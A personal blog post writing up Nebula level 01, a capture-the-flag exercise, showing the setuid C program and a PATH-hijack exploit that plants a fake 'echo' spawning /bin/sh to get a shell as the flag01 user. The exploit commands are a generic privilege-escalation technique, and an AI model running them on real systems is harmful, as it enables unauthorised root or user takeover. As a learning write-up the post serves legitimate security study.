---
author: alvaro
comments: true
layout: post
title: 'Nebula Level 01'
categories:
- Archive
tags:
- security
---

I’ve been reading about security these months ago. I really enjoy learning each day but I think that sometimes is to much theory and I felt the necessity to start practice and gain more confidence about what I was reading. Please you do not misunderstand me, I think that theory plays a main role in security but in the process of learning the practice give you more sight about everything.

Yesterday I downloaded the first virtual machine from [Exploit Exercises](https://exploit-exercises.com). The second exercise show you the next snippet and it encourages you to try find out the vulnerability . 


```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

Basically the `setresgid` and `setresuid` set the program to run with the owner’s permission. These functions have some kind of nuances depending in the system where they are executed. I encourage to read the following [paper](https://www.usenix.org/legacy/event/sec02/full_papers/chen/chen.pdf) to understand it better. Perhaps in other post I will write about them, because thanks to the book [The Art of Software Security Assessment](http://www.amazon.es/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426) I have learned a little bit about their nuances. In this case the file has an user `flag01` since if in the terminal we execute we observe.

```bash
$ find . -type f -perm +6000 -ls 2> /dev/null
12962    8 -rwsr-x---   1 flag01   level01      7322 Nov 20  2011 ./flag01
```

It is a suid program. It Sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner `flag01`. The main issue with this snippet is when it calls `echo` without specifying the absolute path or using `/usr/bin/env` because otherwise it would have execute the built-in echo. But how it uses`/usr/bin/env` it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.

```bash
$ echo '/bin/sh' > /path/echo
$ chmod +x /path/echo
$ PATH=/path/:$PATH
$ ./flag01
sh-4.2$
```

I know that maybe this exercise is easy but as always we have to start from the beginning and never stop to grow. 


{% include twitter_plug.html %}

	